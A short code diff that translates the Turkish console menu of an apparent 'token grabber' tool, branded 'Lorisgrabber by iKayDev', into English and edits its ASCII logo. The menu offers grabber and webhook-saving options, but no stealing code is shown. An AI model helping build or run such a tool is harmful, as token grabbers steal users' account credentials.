@@ -26,7 +26,7 @@ def logo():
                                   "  "$$$$$P"
                                       $$P*"
                                      .$"
-                                     "                 by iKayDev'''
+                                     "                 Lorisgrabber by iKayDev'''
                      , "green")
 
 
@@ -34,10 +34,10 @@ def menu():
     logo()
     print(" ")
     print("""
-    [1] : Token Grabber Menü.
-    [2] : Webhook Kaydet.
-    [3] : Terminal'i Temizle.
-    [4] : Çıkış.
+    [1] : Token Grabber Menu.
+    [2] : Save a Webhook.
+    [3] : Clear Terminal.
+    [4] : Exit.
     """)
     giris()
 
@@ -46,7 +46,7 @@ def menu2():
     print("""
     [1] : Token Grabber Menu.
     [2] : Save a Webhook.
-    [3] : Clear the Terminal.
+    [3] : Clear Terminal.
     [4] : Exit.
     """)
     giris()
